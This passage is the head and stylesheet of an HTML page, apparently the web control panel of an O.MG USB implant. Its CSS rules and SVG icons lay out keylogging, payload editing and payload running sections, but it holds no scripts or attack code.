<!DOCTYPE html>
<html lang="en">

<head>
	<title>O.MG</title>
	<meta charset="utf-8">
	<meta name="viewport" content="viewport-fit=auto,width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta http-equiv="cache-control" content="no-cache">
	<meta http-equiv="expires" content="0">
	<meta http-equiv="pragma" content="no-cache">
	<link href="favicon.ico" rel="shortcut icon" type="image/x-icon">
	<style>
		:root {
			--bgColor1: hsl(0, 0%, 75%);
			--bgColor2: hsl(0, 0%, 25%);
			--bgColor3: hsl(0, 0%, 10%);
			--watermarkColor: hsla(0, 0%, 15%, .4);
			--navColor: hsl(0, 0%, 100%);
			--fontColor: hsl(0, 0%, 100%);
			--inactiveColor: hsl(0, 0%, 30%);
			--inactiveGradient1: hsl(0, 0%, 25%);
			--inactiveGradient2: hsl(0, 0%, 15%);
			--toggleOnColor: hsl(150, 75%, 30%);
			--toggleOnGradient1: hsl(150, 75%, 40%);
			--toggleOnGradient2: hsl(150, 75%, 50%);
			--sidebarGradient: hsla(0, 0%, 5%, 0.7);
			--accentColor: hsl(0, 0%, 40%);
			--accentGradient1: hsl(0, 0%, 30%);
			--accentGradient2: hsl(0, 0%, 50%)
		}

		body,
		input[type=text],
		textarea {
			box-sizing: border-box;
			background-color: var(--bgColor2);
			color: var(--fontColor);
		}

		body {
			-webkit-margin-before: 0;
			-webkit-margin-end: 0;
			-webkit-margin-after: 0;
			-webkit-margin-start: 0;
			-webkit-padding-before: 0;
			-webkit-padding-end: 0;
			-webkit-padding-after: 0;
			-webkit-padding-start: 0;
			width: 100%;
			height: 100%;
			margin: 0;
			padding: 0;
		}

		body {
			flex-direction: column;
			font-family: Arial, Verdana, Tahoma, serif;
			font-size: 1rem;
			font-weight: 400;
			row-gap: 1px;
		}

		button,
		button:hover {
			background: var(--inactiveColor);
		}

		body,
		button {
			text-align: left;
		}

		button {
			display: flex;
			flex-grow: 1;
			justify-content: center;
			height: 44px;
			text-transform: uppercase;
			align-items: center;
			font-size: 1em;
			border: 0;
			fill: var(--fontColor);
			padding: 10px;
			background-image: linear-gradient(to bottom, var(--inactiveGradient1), var(--inactiveGradient2));
			border-radius: 5px;
			-webkit-appearance: none;
		}

		button:hover,
		.buttonSelectedGrey {
			background-image: linear-gradient(to bottom, var(--inactiveGradient2), var(--inactiveGradient1));
			text-decoration: none;
		}

		#contentArea_debug input,
		code {
			background-color: black;
			background-image: url("data:image/svg+xml;charset=UTF-8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'><path style='fill: white;' d='m28,21.8v8.4c0,7-2.8,9.8-9.8,9.8h-8.4c-7,0-9.8-2.8-9.8-9.8v-8.4c0-7,2.8-9.8,9.8-9.8h8.4c7,0,9.8,2.8,9.8,9.8Z'/><path style='fill: lightgrey;' d='m30.2,0h-8.4c-6.9,0-9.7,2.74-9.78,9.5h6.18c8.4,0,12.3,3.9,12.3,12.3v6.18c6.76-.08,9.5-2.88,9.5-9.78v-8.4c0-7-2.8-9.8-9.8-9.8Z'/></svg>");
			background-repeat: no-repeat;
			background-position: top 8px right 8px;
			background-size: 20px 20px;
			border-radius: 12px;
			padding: 8px;
			padding-left: 16px;
			padding-right: 36px;
		}

		body,
		code {
			line-height: 1.5;
		}

		code {
			font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
			font-size: 77.5%;
			color: var(--accentGradient2);
			word-wrap: break-word;
			word-break: break-all;
			display: block;
			margin-top: 10px;
			white-space: pre-wrap;
		}

		code::after {
			content: "\a";
			white-space: pre;
		}

		button,
		h1,
		h2 {
			font-weight: 700;
		}

		h1 {
			margin-block-start: 0;
			margin-block-end: 0;
			margin-inline-start: 0;
			margin-inline-end: 0;
			font-size: 2rem;
			line-height: 1.3;
		}

		h2 {
			text-transform: uppercase;
			align-items: center;
			text-align: left;
			font-size: 1em;
			padding-left: 10px;
		}

		.bigLabel {
			text-transform: uppercase;
			align-items: center;
			text-align: left;
			font-size: 1em;
			padding-left: 10px;
			font-weight: 700;
			top: -10px;
			position: relative;
			vertical-align: middle;
		}

		input {
			color: var(--fontColor);
		}

		input[type=text],
		textarea {
			position: relative;
			display: inline-block;
			font-size: medium;
			width: 200px;
		}

		input[type=radio] {
			position: relative;
			display: inline-block;
			top: -3px;
		}

		#keylogStorage label,
		#payloadStorage label,
		#payloadRun label,
		label {
			position: relative;
			display: block;
			font-size: small;
		}

		a:active,
		a:hover,
		a:link,
		a:visited,
		button,
		nav,
		nav a {
			color: var(--navColor);
		}

		nav {
			display: flex;
			flex-flow: row;
			justify-content: space-between;
			background-color: var(--accentColor);
			box-shadow: inset 20px 20px 30px var(--accentGradient1), inset -20px -20px 30px var(--accentGradient2);
			height: 50px;
			padding-left: .5em;
			margin-right: 10px;
			padding-right: 10px;
			width: calc(100vw - 20px);
		}

		nav a {
			text-decoration: none;
			padding-top: 2em;
			padding-bottom: 2em;
			margin-top: -2em;
			margin-bottom: -2em;
			padding-right: 5px;
		}

		#navbar-wifiIcon,
		nav,
		nav a,
		nav div,
		svg {
			vertical-align: middle;
		}

		nav span {
			height: 50px;
			vertical-align: top;
		}

		.left-side,
		.right-side,
		body {
			display: flex;
			justify-content: flex-start;
		}

		.left-side>div {
			margin-right: 0;
		}

		.right-side>div {
			margin-left: auto;
		}

		.statusLightActive {
			margin-left: 10px;
			width: 10px;
			height: 10px;
			background-color: var(--accentColor);
			border-radius: 50%;
			box-shadow: 5 5 5 5 var(--inactiveColor);
			transform: scale(1);
			animation: pulse 2s infinite;
		}

		#navbar-wifiIcon {
			position: relative;
			left: 10px;
			top: 0px;
			height: 40px;
			visibility: visible;
			width: 40px;
			padding-top: 0;
		}

		#wifiDetails {
			display: flex;
			flex-direction: column;
			margin-left: 6px;
			font-size: 0.7em;
			text-align: center;
			row-gap: 0px;
			position: relative;
			left: -33px;
			top: 34px;
		}

		.networkIn {
			fill: grey;
		}

		.networkOut {
			fill: grey;
		}

		@keyframes networkpulse {
			0% {
				fill: grey;
			}

			50% {
				fill: lightgrey;
			}

			100% {
				fill: grey;
			}
		}

		.networkActive {
			animation: networkpulse 0.5s;
		}

		#wifiRTT {
			height: 1em;
		}

		svg {
			fill: var(--navColor);
		}

		content textarea {
			border-top: 0;
			border-bottom: 0;
			border-right: 0;
		}

		#payloadEditorFile {
			position: absolute;
			top: 0;
			right: 0;
			margin-right: 14px;
			background-color: rgba(0, 0, 0, .0);
			color: #fff;
			z-index: 10;
		}

		#contentArea_debug {
			color: var(--navColor);
		}

		#contentArea_debug input {
			color: var(--fontColor);
		}

		#footerKeylog,
		#footerPayload {
			padding-top: 0;
			position: relative;
			top: -5px;
		}

		#payloadLoadSelect,
		#payloadSelect {
			background-color: #000;
		}

		#helpExamples {
			width: calc(100% - 10px);
		}

		#helpExamples h3 {
			padding-bottom: 0;
			line-height: 20px;
			margin-block-end: 0;
			margin-bottom: 5px;
		}

		#helpExamples pre {
			color: var(--bgColor1);
			font-family: Arial, Verdana, Tahoma, serif;
			white-space: pre-wrap;
		}

		#keylogStorage,
		#payloadStorage,
		#payloadRun {
			position: relative;
			padding-left: 11px;
			padding-top: 0;
			margin-top: -2px;
			border-left-width: 4px;
			border-left-color: var(--accentGradient1);
		}

		#keylogStorage label,
		#payloadStorage label,
		#payloadRun label {
			top: 0;
			height: 2px;
			text-align: center;
		}

		#payloadStorage {
			padding-top: 7px;
		}

		#payloadRun {
			padding-top: 7px;
		}

		#keymap_row1,
		#keymap_row2,
		#keymap_row3,
		#keymap_row4,
		#keymap_row5,
		#keymap_row6 {
			display: grid;
			justify-content: space-between;
			height: 60px;
			gap: 5px;
			padding: 5px;
		}

		#keymap_row1,
		#keymap_row4 {
			grid-template-columns: repeat(13, 1fr);
		}

		#keymap_row2,
		#keymap_row3 {
			grid-template-columns: repeat(14, 1fr);
		}

		#keymap_row5 {
			grid-template-columns: repeat(12, 1fr);
		}

		#keymap_row6 {
			grid-template-columns: repeat(7, 1fr);
		}

		#keymapViewer {
			position: absolute;
			vertical-align: middle;
			float: left;
			top: calc((var(--app-height) - 448px)/2);
			width: 90vw;
			height: 448px;
			border-radius: 5px;
			background-color: var(--bgColor2);
			-webkit-box-shadow: 5px 5px 15px 5px var(--inactiveGradient2);
			box-shadow: 5px 5px 15px 5px var(--inactiveGradient2);
			color: var(--fontColor);
		}

		#keymapViewerLabel {
			text-align: left;
			color: var(--navColor);
			padding-left: 5px;
			padding-top: 5px;
		}

		#keymapViewerSelect {
			width: 120px;
		}

		#partitionEditor,
		#partitionApplied {
			position: absolute;
			vertical-align: middle;
			float: left;
			width: 280px;
			height: auto;
			top: calc((var(--app-height) - 448px)/2);
			border-radius: 5px;
			background-color: var(--bgColor2);
			-webkit-box-shadow: 5px 5px 15px 5px var(--inactiveGradient2);
			box-shadow: 5px 5px 15px 5px var(--inactiveGradient2);
			color: var(--navColor);
			padding-left: 5px;
			padding-top: 5px;
		}

		#loadingScreen {
			position: absolute;
			vertical-align: middle;
			text-align: center;
			float: left;
			width: 240px;
			height: 160px;
			top: calc((var(--app-height) - 448px)/2);
			border-radius: 5px;
			background-color: var(--bgColor2);
			-webkit-box-shadow: 5px 5px 15px 5px var(--inactiveGradient2);
			box-shadow: 5px 5px 15px 5px var(--inactiveGradient2);
			color: var(--navColor);
			padding-left: 5px;
			padding-top: 5px;
		}

		.loader {
			position: relative;
			align-content: center;
			border: 16px solid var(--bgColor1);
			border-top: 16px solid var(--accentColor);
			border-radius: 50%;
			width: 80px;
			height: 80px;
			left: 70px;
			top: 10px;
			animation: spin 2s linear infinite;
		}

		#logo {
			height: 50px;
			padding-top: 0;
			background-image: url("data:image/svg+xml;charset=UTF-8,<svg xmlns='http://www.w3.org/2000/svg' xml:space='preserve' fill='white' viewBox='110 25 82 50'><path d='M139.29 61.07a3 3 0 0 1 2.76 4.14c-.15.36-.37.68-.64.94s-.59.47-.96.64a2.87 2.87 0 0 1-2.32 0 2.96 2.96 0 0 1 0-5.49 3 3 0 0 1 1.16-.23zm8.11-13.77h4.92l3.9 10.28 4.13-10.28h4.97l2.91 19.23h-5l-1.4-11.07h-.05l-4.61 11.07h-1.99l-4.41-11.07h-.05l-1.61 11.07h-4.97l3.26-19.23zm42.13 8.49c-.02.7-.05 1.37-.09 2.03-.04.65-.13 1.3-.27 1.93a10.2 10.2 0 0 1-1.61 3.65 8.3 8.3 0 0 1-3.47 2.88c-1.36.6-2.85.89-4.46.89-1.51 0-2.9-.25-4.16-.74a9.26 9.26 0 0 1-5.34-5.28c-.5-1.24-.75-2.62-.75-4.13 0-1.57.25-2.98.75-4.26a9.27 9.27 0 0 1 5.43-5.36c1.28-.49 2.7-.74 4.25-.74 1.99 0 3.72.45 5.2 1.34s2.64 2.24 3.47 4.04l-4.75 1.99c-.34-.92-.86-1.66-1.57-2.22s-1.57-.85-2.59-.85c-.82 0-1.54.18-2.17.54s-1.15.83-1.57 1.4a6.3 6.3 0 0 0-.94 1.95 7.77 7.77 0 0 0 .01 4.39c.22.72.54 1.36.97 1.93.43.56.96 1.01 1.6 1.37.64.35 1.36.52 2.18.52 1.09 0 2-.28 2.75-.83s1.17-1.39 1.28-2.51h-4.08v-3.93h9.93zm-53.52-16.11c-.62-.72-1.52-1.77-1.51-2.75.01-1.1.7-2.08 1.55-2.7.86-.61 2.26-.77 3.25-1.07l-.03-.07c-1.18-.26-2.41-.36-3.6-.12s-2.33.83-3.12 1.8-1.19 2.32-.9 3.57c.2.88.72 1.65 1.26 2.35.55.7 1.13 1.38 1.52 2.2.39.81.55 1.8.2 2.63-.42.99-1.47 1.54-2.5 1.6-.85.06-1.7-.16-2.52-.42a10.82 10.82 0 0 0-8.54.11c-.71.21-1.44.37-2.18.32-1.02-.07-2.08-.61-2.49-1.6-.35-.83-.19-1.82.2-2.63s.97-1.49 1.52-2.2a6.23 6.23 0 0 0 1.26-2.35c.29-1.24-.11-2.6-.9-3.57s-1.94-1.56-3.12-1.8a8.92 8.92 0 0 0-3.6.12l-.02.07c1 .3 2.39.45 3.25 1.07.86.61 1.54 1.6 1.55 2.7.01.98-.89 2.03-1.51 2.75-.62.73-1.36 1.34-1.94 2.1a6.88 6.88 0 0 0-.56 7.15 6.26 6.26 0 0 0 3.27 2.86 10.87 10.87 0 1 0 19.36.03 6.2 6.2 0 0 0 3.35-2.89 6.86 6.86 0 0 0-.56-7.15c-.58-.77-1.31-1.38-1.94-2.11zm-10.57 23.33a6.36 6.36 0 1 1 0-12.73 6.36 6.36 0 0 1 0 12.73z'/></svg>");
		}

		#ico_settings {
			background-image: url("data:image/svg+xml;charset=UTF-8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 39.22 40'><path style='fill: white;' d='m34.49,22.11c.1-.67.19-1.34.19-2.11s-.1-1.44-.19-2.11l4.31-3.06c.38-.29.57-.86.29-1.34l-4.21-7.08c-.29-.48-.77-.67-1.24-.38l-4.78,2.2c-1.15-.86-2.3-1.53-3.64-2.11l-.48-5.26c-.1-.48-.48-.86-.96-.86h-8.23c-.48,0-.96.38-.96.86l-.48,5.26c-1.34.57-2.58,1.24-3.64,2.11l-4.78-2.2c-.48-.19-1.05,0-1.24.38L.33,13.49c-.29.48-.1,1.05.29,1.34l4.31,3.06c-.1.67-.19,1.34-.19,2.11s.1,1.44.19,2.11L.43,25.17c-.38.29-.57.86-.29,1.34l4.11,7.08c.29.48.77.67,1.24.38l4.78-2.2c1.15.86,2.3,1.53,3.64,2.11l.48,5.26c.1.48.48.86.96.86h8.23c.48,0,.96-.38.96-.86l.48-5.26c1.34-.57,2.58-1.24,3.64-2.11l4.78,2.2c.48.19,1.05,0,1.24-.38l4.11-7.08c.29-.48.1-1.05-.29-1.34l-4.02-3.06Zm-14.93,7.46c-5.26,0-9.57-4.31-9.57-9.57s4.31-9.57,9.57-9.57,9.57,4.31,9.57,9.57-4.31,9.57-9.57,9.57Z'/><path style='fill: grey;' d='m19.56,8.52c-6.32,0-11.48,5.17-11.48,11.48s5.17,11.48,11.48,11.48,11.48-5.17,11.48-11.48-5.17-11.48-11.48-11.48Zm0,16.27c-2.68,0-4.78-2.11-4.78-4.78s2.11-4.78,4.78-4.78,4.78,2.11,4.78,4.78-2.11,4.78-4.78,4.78Z'/></svg>");
		}

		#ico_about {
			background-image: url("data:image/svg+xml;charset=UTF-8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 38 40'><path style='fill: white' d='m32,0H6C2.7,0,0,2.7,0,6v34l6-6h26c3.3,0,6-2.7,6-6V6c0-3.3-2.7-6-6-6Zm-11,25h-4v-11h4v11Zm-2-14c-1.1,0-2-.9-2-2s.9-2,2-2,2,.9,2,2-.9,2-2,2Z'/></svg>");
		}

		#ico_help {
			background-image: url("data:image/svg+xml;charset=UTF-8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 39.99 40'><g><rect style='fill: white' x='30.57' y='24.07' width='4' height='16.98' transform='translate(-13.48 32.57) rotate(-45)'/><circle style='fill: white' cx='15.99' cy='15.99' r='15.99'/></g><rect style='fill: grey' x='32.18' y='28.1' width='4' height='12.29' transform='translate(-14.2 34.2) rotate(-45)'/><circle style='fill: dimgrey' cx='15.99' cy='15.99' r='12.99'/><path style='fill: white' d='m22.88,10.19c-1.7-2-4.2-3.2-6.89-3.2s-5.2,1.2-6.89,3.2c-.4.4-.3,1.1.1,1.4.4.4,1.1.3,1.4-.1,1.4-1.6,3.3-2.5,5.4-2.5s4,.9,5.4,2.5c.2.2.5.4.8.4.2,0,.5-.1.6-.2.4-.4.4-1.1.1-1.5Z'/></svg>");
		}

		#ico_syslog {
			background-image: url("data:image/svg+xml;charset=UTF-8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 38.39 40' fill='white'><path d='m31.17,0H7.23C3.24,0,0,3.24,0,7.23v19.94c0,3.99,3.24,7.23,7.23,7.24h5.73v2.35h-6.67v3.24h25.82v-3.24h-6.67v-2.35h5.72c3.99,0,7.23-3.24,7.23-7.23V7.23h0c.02-3.99-3.21-7.23-7.21-7.23h-.01Zm3.41,27.19h0c0,1.33-1.08,3.42-2.41,3.42H7.23c-1.33,0-3.41-2.08-3.41-3.41h0v-8.3h12.43l1.04-3.38,4.8,10.9,2.17-7.57h10.32v8.36h0v-.02Zm0-10.76h-12.12l-.84,2.96-4.72-10.72-2.41,7.82H3.82V7.24c0-1.33,2.08-3.41,3.41-3.42h23.94c1.33,0,3.41,2.08,3.41,3.41h0v9.2Z'/></svg>");
		}

		#ico_payload {
			background-image: url("data:image/svg+xml;charset=UTF-8,<svg xmlns='http://www.w3.org/2000/svg' xml:space='preserve' fill='white' viewBox='0 0 512 512'><path d='M432 448H189c-5-14-15-24-29-29V80c0-4-2-8-5-11L91 5a16 16 0 00-22 22l59 60v332a48 48 0 1061 61h243a16 16 0 000-32zm-288 32a16 16 0 110-32 16 16 0 010 32z'/><path d='M400 256h-64v64h-64v-64h-64c-9 0-16 7-16 16v128l16 16h192c9 0 16-7 16-16V272c0-9-7-16-16-16zM336 128h-48v32h-32v-32h-48c-9 0-16 7-16 16v80h160v-80c0-9-7-16-16-16z'/></svg>");
		}

		#ico_keylog {
			background-image: url("data:image/svg+xml;charset=UTF-8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 39.99 32.52'><path fill='white' d='m37.56,0H2.43C1.09,0,0,1.09,0,2.43v16.64c0,2.09,1.69,3.78,3.78,3.78h32.43c2.09,0,3.78-1.69,3.78-3.78V2.43c0-1.34-1.09-2.43-2.43-2.43Zm-11.85,3.81h3.81v3.81h-3.81v-3.81Zm0,5.71h3.81v3.81h-3.81v-3.81Zm-5.71-5.71h3.81v3.81h-3.81v-3.81h0Zm0,5.71h3.81v3.81h-3.81v-3.81h0Zm-5.71-5.71h3.81v3.81h-3.81v-3.81Zm0,5.71h3.81v3.81h-3.81v-3.81Zm-5.71-5.71h3.81v3.81h-3.81v-3.81Zm0,5.71h3.81v3.81h-3.81v-3.81Zm-1.9,9.52h-3.81v-3.81h3.81v3.81Zm0-5.71h-3.81v-3.81h3.81v3.81Zm0-5.71h-3.81v-3.81h3.81v3.81Zm24.76,11.43H8.57v-3.81h22.85v3.81Zm5.71,0h-3.81v-3.81h3.81v3.81Zm0-5.71h-5.71V3.81h5.71v9.52Z'/><g><rect style='fill: grey' x='20.92' y='23.2' width='2.34' height='9.93' transform='translate(-13.45 23.87) rotate(-45)'/><circle style='fill: grey' cx='12.39' cy='18.47' r='9.35'/></g><rect style='fill: grey' x='21.87' y='25.56' width='2.34' height='7.19' transform='translate(-13.87 24.83) rotate(-45)'/><circle style='fill: white' cx='12.39' cy='18.47' r='7.6'/><path style='fill: grey' d='m16.42,15.08c-.99-1.17-2.46-1.87-4.03-1.87s-3.04.7-4.03,1.87c-.23.23-.18.64.06.82.23.23.64.18.82-.06.82-.94,1.93-1.46,3.16-1.46s2.34.53,3.16,1.46c.12.12.29.23.47.23.12,0,.29-.06.35-.12.23-.23.23-.64.06-.88h-.01Z'/></svg>");
		}

		#ico_keylogDownload {
			background-image: url("data:image/svg+xml;charset=UTF-8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 39.98 40'><path id='update' fill='white' d='m34.11,34.15l4.72,4.72c.12.12.2.29.2.47,0,.37-.3.67-.67.67h-13.05c-.74,0-1.33-.6-1.33-1.33v-13.05c0-.18.07-.35.2-.47.26-.26.68-.26.94,0l5.21,5.21c2.11-2.11,3.53-4.82,4.06-7.75,1.45-7.97-3.84-15.61-11.81-17.06-7.97-1.45-15.61,3.84-17.06,11.81s3.84,15.61,11.81,17.06v5.39C7.39,38.46-.01,29.98,0,19.97.01,8.93,8.97-.01,20.01,0c11.04.01,19.98,8.97,19.97,20.01,0,5.31-2.11,10.4-5.87,14.14Z'/></svg>");
		}

		#ico_payloadLoad {
			background-image: url("data:image/svg+xml;charset=UTF-8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 30.48 39.88'><polygon fill='white' points='30.48 39.88 0 39.88 0 9.88 20.95 9.88 30.48 19.4 30.48 39.88'/><polygon fill='white' points='29.05 20.35 20 20.35 20 11.3 29.05 20.35'/><polygon fill='grey' points='22.87 9.09 7.61 9.09 15.24 0 22.87 9.09'/><rect fill='grey' x='12.46' y='24.19' width='5.55' height='2.78'/><rect fill='grey' x='12.46' y='20.03' width='5.55' height='2.78'/><rect fill='grey' x='12.46' y='7.01' width='5.55' height='7.63'/><rect fill='grey' x='2.75' y='34.3' width='24.98' height='2.78'/><rect fill='grey' x='2.75' y='29.22' width='24.98' height='2.78'/><rect fill='grey' x='12.46' y='15.95' width='5.55' height='2.78'/></svg>");
		}

		#ico_keylogLiveLog {
			background-image: url("data:image/svg+xml;charset=UTF-8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 38 40'><path style='fill: white;' d='m32,0H6C2.7,0,0,2.7,0,6v34l6-6h26c3.3,0,6-2.7,6-6V6c0-3.3-2.7-6-6-6ZM9,20c-1.66,0-3-1.34-3-3s1.34-3,3-3,3,1.34,3,3-1.34,3-3,3Zm10,0c-1.66,0-3-1.34-3-3s1.34-3,3-3,3,1.34,3,3-1.34,3-3,3Zm10,0c-1.66,0-3-1.34-3-3s1.34-3,3-3,3,1.34,3,3-1.34,3-3,3Z'/></svg>");
		}

		#ico_keylogSave,
		#ico_payloadSave {
			margin-right: 8px;
			background-image: url("data:image/svg+xml;charset=UTF-8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 30.48 39.88'><polygon fill='white' points='30.48 39.88 0 39.88 0 9.88 20.95 9.88 30.48 19.4 30.48 39.88'/><polygon fill='white' points='29.05 20.35 20 20.35 20 11.3 29.05 20.35'/><polygon fill='grey' points='15.24 26.97 7.61 17.88 22.87 17.88 15.24 26.97'/><rect fill='grey' x='12.46' width='5.55' height='2.78'/><rect fill='grey' x='12.46' y='4.16' width='5.55' height='2.78'/><rect fill='grey' x='12.46' y='12.33' width='5.55' height='7.63'/><rect fill='grey' x='2.75' y='34.3' width='24.98' height='2.78'/><rect fill='grey' x='2.75' y='29.22' width='24.98' height='2.78'/><rect fill='grey' x='12.46' y='8.24' width='5.55' height='2.78'/></svg>");
		}

		#ico_payloadBuild {
			background-image: url("data:image/svg+xml;charset=UTF-8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 39.99 39.99'><path fill='white' d='m35.55,0H4.44C2,0,0,2,0,4.44v31.11c0,2.44,2,4.44,4.44,4.44h31.11c2.44,0,4.44-2,4.44-4.44V4.44c0-2.44-2-4.44-4.44-4.44ZM11.44,30.94c-1.16,1.22-3.21,2.98-4.75,1.08-1.86-2.28.14-3.37,1.4-4.72l9.69-8.82h0s3.33,3.49,3.33,3.49l-9.66,8.97Zm16.48-6.43l-2.59-2.62,2.12-2.03-2.67-2.33-2.17,1.96-3.33-3.18,2.65-2.57c-1.97-3.43-4.67-4.99-7.5-4.86,6.29-3.94,11.32.06,11.32.06l2.59,3.24-1.06,2.6,2.3,2.38,2.75-2.36,2.53,2.97-6.96,6.75Z'/></svg>");
		}

		#ico_keylogRun,
		#ico_payloadRun {
			background-image: url("data:image/svg+xml;charset=UTF-8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'><path style='fill: white;' d='m35.56,0H4.44C2,0,0,2,0,4.44v31.11c0,2.44,2,4.44,4.44,4.44h31.11c2.44,0,4.44-2,4.44-4.44V4.44c0-2.44-2-4.44-4.44-4.44ZM15.56,28.89V11.11l12.22,8.89-12.22,8.89Z'/></svg>");
		}

		#ico_settings,
		#ico_about,
		#ico_help {
			margin-top: 8px;
			width: 34px;
			height: 34px;
			background-repeat: no-repeat;
		}

		#ico_keylog,
		#ico_payload,
		#ico_syslog {
			width: 34px;
			height: 34px;
			background-repeat: no-repeat;
		}

		#ico_keylog {
			height: 28px;
		}

		#ico_syslog {
			height: 30px;
		}

		#ico_keylogDownload,
		#ico_keylogLiveLog,
		#ico_keylogRun,
		#ico_keylogSave,
		#ico_payloadBuild,
		#ico_payloadLoad,
		#ico_payloadRun,
		#ico_payloadSave,
		#ico_wifi {
			width: 32px;
			height: 32px;
			background-repeat: no-repeat;
		}

		#ico_wifi {
			width: 35px;
			height: 35px;
		}

		#modelText {
			position: absolute;
			left: 45px;
			top: 2px;
			text-transform: uppercase;
		}

		#modal {
			top: calc((var(--app-height) - 320px)/2);
			height: 320px;
		}

		#modalLabel {
			text-align: left;
			color: var(--navColor);
			padding-left: 5px;
			padding-top: 5px;
		}

		#modalMessage {
			color: var(--fontColor);
			padding-left: 5px;
			padding-right: 5px;
			width: 100%;
		}

		#modalButtons {
			display: flex;
			flex-grow: auto;
			position: absolute;
			bottom: 5px;
			right: 5px;
			width: calc(100% - 10px);
		}

		#navbarAlerts {
			margin-top: 8px;
			top: 0px;
			display: inline-block;
			text-align: center;
			align-content: center;
			max-width: 180px;
			min-width: 10px;
			line-height: normal;
		}

		#navbar-Links svg {
			padding-top: 7px;
		}

		#payloadLoadMenu,
		#payloadSaveMenu,
		#payloadFileMenu {
			position: fixed;
			height: 200px;
			bottom: 57px;
			left: 10px;
			padding: 10px;
			background-color: var(--inactiveGradient2);
			border-top-left-radius: 10px;
			border-top-right-radius: 10px;
			background-image: -webkit-linear-gradient(top, var(--inactiveGradient1), var(--inactiveGradient2));
			background-image: -moz-linear-gradient(top, var(--inactiveGradient1), var(--inactiveGradient2));
			background-image: -ms-linear-gradient(top, var(--inactiveGradient1), var(--inactiveGradient2));
			background-image: -o-linear-gradient(top, var(--inactiveGradient1), var(--inactiveGradient2));
			background-image: linear-gradient(to bottom, var(--inactiveGradient1), var(--inactiveGradient2));

		}

		#fileMenuFlex {
			display: flex;
			justify-content: left;
		}

		#columnLeft,
		#columnRight {
			display: flex;
			flex-direction: column;
			gap: 10px;
			/* adjust as needed */
		}

		#columnLeft,
		#columnLeft input {
			width: 246px;
		}

		#columnRight {
			padding-left: 5px;
			width: 100px;
		}

		.payloadList {
			padding: 10px;
			font-size: 16px;
			border: 1px solid #ccc;
			border-radius: 4px;
			box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075);
			width: 100%;
		}

		.payloadList:focus {
			outline: 0;
			border-color: #66afe9;
			box-shadow: 0 0 0 3px rgba(102, 175, 233, .6);
		}

		select {
			padding: 8px;
			font-size: 16px;
			border: 1px solid #ccc;
			border-radius: 4px;
			box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075);
			appearance: none;
			-webkit-appearance: none;
			-moz-appearance: none;
			background-color: rgba(0, 0, 0, .075);
			color: white;
			appearance: none;
			-webkit-appearance: none;
			-moz-appearance: none;
		}

		select:focus {
			outline: 0;
			border-color: #66afe9;
			box-shadow: 0 0 0 3px rgba(102, 175, 233, .6);
		}

		#deviceSelect {
			height: 40px;
			padding-top: 7px;
		}

		#sidebar {
			max-height: calc(var(--app-height) - 50px);
			position: absolute;
			top: 50px;
			right: 0;
			width: 320px;
			margin: 0;
			overflow: auto;
			background-color: var(--sidebarGradient);
			-webkit-box-shadow: -6px 0 15px 5px var(--sidebarGradient);
			box-shadow: -6px 0 15px 5px var(--sidebarGradient);
			height: var(--app-height);
		}

		#sidebar,
		#sidebar a:active,
		#sidebar a:link,
		#sidebar a:visited {
			color: var(--navColor);
		}

		#releaseTeam a,
		#sidebar a:hover,
		.about-twitter a {
			color: var(--accentColor);
		}

		#sidebar input {
			color: var(--fontColor);
		}

		#sidebar_about,
		#sidebar_help,
		#sidebar_settings {
			padding-left: 10px;
		}

		#sidebar_settings_subnav {
			width: calc(100% - 10px);
			padding-left: 0;
		}

		#subnav button {
			border-bottom-left-radius: 0;
			border-bottom-right-radius: 0;
			margin-inline: 1px;
		}

		.about-role {
			margin-bottom: 20px;
		}

		.about-section-credits {
			margin-bottom: 0;
			columns: 2;
		}

		.about-team-name {
			font-size: 14px;
			color: var(--bgColor1);
			margin-right: 10px;
		}

		.about-role,
		.about-twitter {
			font-size: 12px;
			color: var(--navColor);
		}

		.button-container {
			position: relative;
			left: 0;
			top: 0;
			transform: translate(0, 0);
		}

		.buttonSelected,
		.buttonSelected:hover,
		.buttonRunning,
		.buttonRunning:hover {
			background: var(--accentColor);
			background-image: -webkit-linear-gradient(top, var(--accentGradient1), var(--accentGradient2));
			background-image: -moz-linear-gradient(top, var(--accentGradient1), var(--accentGradient2));
			background-image: -ms-linear-gradient(top, var(--accentGradient1), var(--accentGradient2));
			background-image: -o-linear-gradient(top, var(--accentGradient1), var(--accentGradient2));
			background-image: linear-gradient(to bottom, var(--accentGradient1), var(--accentGradient2));
		}

		.buttonSelected:hover,
		.buttonRunning:hover {
			background-image: -webkit-linear-gradient(top, var(--accentGradient1), var(--accentGradient2));
			background-image: -moz-linear-gradient(top, var(--accentGradient1), var(--accentGradient2));
			background-image: -ms-linear-gradient(top, var(--accentGradient1), var(--accentGradient2));
			background-image: -o-linear-gradient(top, var(--accentGradient1), var(--accentGradient2));
			background-image: linear-gradient(to bottom, var(--accentGradient1), var(--accentGradient2));
		}

		.close,
		.closeModal {
			color: var(--fontColor);
			float: right;
			font-size: 2rem;
			font-weight: 700;
			line-height: 1;
			text-shadow: 0 1px 0 var(--navColor);
			background-color: var(--bgColor3);
			border-color: var(--bgColor3);
			position: fixed;
			right: 0;
			top: 50px;
		}

		.closeModal {
			right: 0px;
			top: 0;
			position: absolute;
		}

		.contentFullscreen {
			width: calc(100%);
		}

		.contentSidebar {
			width: calc(100% - 325px);
		}

		.footerSidebar {
			width: calc(100% - 365px);
		}

		.footerFullscreen {
			width: calc(100% - 40px);
		}

		.editor-wrapper {
			display: flex;
			position: relative;
		}

		.editor div {
			position: relative;
			white-space: pre-wrap;
		}

		.debug-info {
